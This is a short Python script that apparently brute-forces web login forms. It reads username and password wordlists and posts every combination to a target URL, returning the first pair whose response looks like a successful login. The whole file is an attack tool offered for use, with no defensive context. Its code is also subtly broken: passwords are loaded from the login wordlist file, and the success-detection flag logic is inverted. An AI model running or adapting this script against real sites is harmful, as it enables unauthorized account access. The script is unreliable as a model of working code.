# -*- coding: utf_8 -*-

import requests

def brute(url, loginfield, pwdfield, Size=0):
	try:
		url = str(url)
		pwdfield = str(pwdfield)
		loginfield = str(loginfield)
		
		logins = []
		f = open('brutebase_login_' + str(Size) + '.txt', 'r')
		for line in f:
			logins.append(line[:-1])
		f.close()
		
		pwds = []
		f = open('brutebase_login_' + str(Size) + '.txt', 'r')
		for line in f:
			pwds.append(line[:-1])
		f.close()
		
		invalid = []
		f = open('invalid_login.txt', 'r')
		for line in f:
			if len(line) > 2:
				invalid.append(line[:-1])
		
		flag = 0 != 0
		
		r = requests.post(url, data={loginfield : '3toTo4noNeparol', pwdfield : '3toto4noNelogin'})
		if r.status_code == 200:
			bad_test = r.text
			for log in logins:
				if flag:
					break
				else:
					for pas in pwds:
						r = requests.post(url, data={loginfield : log, pwdfield : pas})
						if r.status_code == 200:
							test = r.text
							for inva in invalid:
								if test.find(inva) != -1:
									flag = 0 == 0
									break
							if flag:
								if bad_test != test:
									return [log,pas]
									break
	except:
		flag = 0 != 0
	if not(flag):
		return ['None', 'None', 'None']
